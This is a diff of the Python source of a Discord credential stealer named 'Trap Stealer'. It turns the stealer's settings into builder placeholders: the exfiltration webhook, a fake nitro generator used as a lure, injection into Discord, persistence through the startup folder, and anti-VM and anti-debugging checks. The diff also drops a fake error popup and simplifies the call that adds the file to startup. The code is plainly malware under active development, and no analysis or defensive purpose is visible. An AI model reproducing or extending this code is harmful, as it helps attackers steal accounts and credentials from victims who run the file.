@@ -23,16 +23,15 @@ import os.path, zipfile
 import shutil, json
 ### CONFIG ### 
 
-webhook = '' #Put ur webhook
+webhook = '%Webhook%' #Put ur webhook
 
-FakeWebhook = False # If True, starts a fake webhook tool with options to delete, spam, etc.
-Fakegen = False # If True, starts a fake Discord nitro generator
-injection = False # If True, injects into Discord
-fakeerror = False # If True, displays a fake error message at the end
-Startup = False # If True, adds the file to the startup folder
-antidebugging = False # # If False, does not check for VM or debugger
-DiscordStop = False # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
-StartupMessage = 'An error occurred while trying to add Trap Stealer to the startup folder. Please check your permissions or make sure Startup is set to True.' # The message displayed if Startup is set to True
+FakeWebhook = '%FakeWebhook%' # If True, starts a fake webhook tool with options to delete, spam, etc.
+Fakegen = '%FakeGen%' # If True, starts a fake Discord nitro generator
+injection = '%Injection%' # If True, injects into Discord
+Startup = '%Startup%' # If True, adds the file to the startup folder
+antidebugging = '%No_Debug%' # # If False, does not check for VM or debugger
+DiscordStop = '%Close%' # If True, prevents Discord from being launched again by removing content from the startup file. Note: this will disable injection.
+StartupMessage = 'Error while adding Trap into the startup folder' # DONT TOUCH / The message displayed if Startup is set to True
 
 
 def antidebug():
@@ -289,13 +288,11 @@ def startup():
             pass
 
 
-try:
-    if Startup == True:
-        startup()
-    else:
-        pass
-except:
+if Startup == True:
+    startup()
+else:
     pass
+
 
 def LoadUrlib(hook, data='', files='', headers=''):
     for i in range(8):
@@ -1006,8 +1003,3 @@ def GatherAll():
     else:pass
 
 GatherAll() 
-
-if fakeerror == True:
-    ctypes.windll.user32.MessageBoxW(0, "Error, Restart...", "Retry!", 16)
-else:
-    pass
